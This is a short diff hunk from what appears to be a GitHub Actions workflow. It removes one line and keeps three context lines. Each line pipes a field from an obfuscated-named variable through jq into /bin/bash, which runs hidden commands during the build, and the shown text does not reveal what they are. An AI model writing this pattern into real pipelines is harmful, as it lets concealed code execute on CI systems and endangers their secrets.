@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$lxi94" | jq -r .zzkjc73 | /bin/bash
           printf '%s' "$ow718" | jq -r .yyea1 | /bin/bash
           echo $ygnw9279 | jq -r .uox67 | /bin/bash
-          printf '%s' "$ptn7185" | jq -r .jvalv2 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
